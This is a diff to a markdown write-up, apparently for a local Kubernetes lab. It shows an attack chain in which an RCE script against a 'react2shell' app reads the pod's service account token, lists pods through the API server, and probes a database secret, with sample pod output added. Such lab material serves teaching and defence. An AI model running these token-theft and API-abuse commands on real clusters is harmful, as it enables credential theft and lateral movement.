@@ -87,7 +87,19 @@ python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.defaul
 
 python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
 # list all pods
+      # "metadata": {
+      #   "name": "leftover",
+      #   "namespace": "insecure",
+      # "spec": {
+      #   "serviceAccountName": "leftover",
+      #   "serviceAccount": "leftover",
 
+      # "metadata": {
+      #   "name": "react2shell-7cdb9b89b-zmzt9",
+      #   "namespace": "insecure",
+      # "spec": {
+      #   "serviceAccountName": "react2shell",
+      #   "serviceAccount": "react2shell",
 ```
 
 ---
@@ -101,9 +113,23 @@ The chain: recon with the frontend token → spot the over-privileged
 db secret.
 
 ```sh
-# [1] recon: frontend token lists pods in its own ns -> spots backend-leftover
-python scripts/rce.py http://localhost:8080 'APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/vuln/pods'
-# -> pods: react2shell-* (sa: frontend), backend-leftover (sa: backend)
+# spot leftover pod
+python scripts/rce.py http://localhost:8080 "APISERVER=https://kubernetes.default.svc;SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SERVICEACCOUNT}/token);CACERT=${SERVICEACCOUNT}/ca.crt;curl -sS --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\" -X GET ${APISERVER}/api/v1/namespaces/insecure/pods"
+      # "metadata": {
+      #   "name": "leftover",
+      #   "namespace": "insecure",
+      # "spec": {
+      #   "serviceAccountName": "leftover",
+      #   "serviceAccount": "leftover",
+
+      # "metadata": {
+      #   "name": "react2shell-7cdb9b89b-zmzt9",
+      #   "namespace": "insecure",
+      # "spec": {
+      #   "serviceAccountName": "react2shell",
+      #   "serviceAccount": "react2shell",
+
+
 
 # [2] frontend CANNOT read the db crown jewel directly (confinement holds)
 python scripts/rce.py http://localhost:8080 'APISERVER=https://kubernetes.default.svc;SA=/var/run/secrets/kubernetes.io/serviceaccount;TOKEN=$(cat ${SA}/token);curl -sS -o /dev/null -w "%{http_code}\n" --cacert ${SA}/ca.crt -H "Authorization: Bearer ${TOKEN}" ${APISERVER}/api/v1/namespaces/db/secrets/secret-cluster'
